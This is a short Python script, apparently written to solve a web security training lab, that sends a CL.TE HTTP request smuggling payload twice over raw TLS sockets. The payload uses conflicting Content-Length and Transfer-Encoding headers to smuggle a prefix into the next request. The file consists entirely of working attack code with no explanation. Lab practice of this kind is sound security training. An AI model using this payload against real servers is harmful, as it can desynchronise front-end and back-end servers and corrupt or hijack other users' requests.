import socket
import ssl

host = '0a100037047fc11980f212f200640008.web-security-academy.net'
port = 443

# Smuggling payload (CL.TE)
payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 35\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /404 HTTP/1.1\r\n"
    "X-Ignore: X\r\n"
    "\r\n"
)

def send_raw_https(host, port, raw_payload):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.sendall(raw_payload.encode())
            response = ssock.recv(4096)
            print(response.decode(errors="ignore"))

print("[+] Sending first payload...")
send_raw_https(host, port, payload)

print("\n[+] Sending second payload...")
send_raw_https(host, port, payload)
